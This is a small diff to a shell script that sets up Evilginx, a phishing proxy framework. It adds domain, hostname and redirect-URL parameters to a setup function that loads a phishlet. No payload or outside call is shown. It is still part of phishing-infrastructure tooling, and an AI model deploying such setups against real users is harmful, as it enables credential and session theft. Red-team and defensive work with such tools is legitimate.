@@ -3,6 +3,10 @@
 mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
 
 setup_evilginx() {
+    domain_name=$1
+    hostname=$2
+    redirect_url=$3
+    
     echo "Setting up Evilginx for domain: $domain_name"
 
     # Load the phishlet
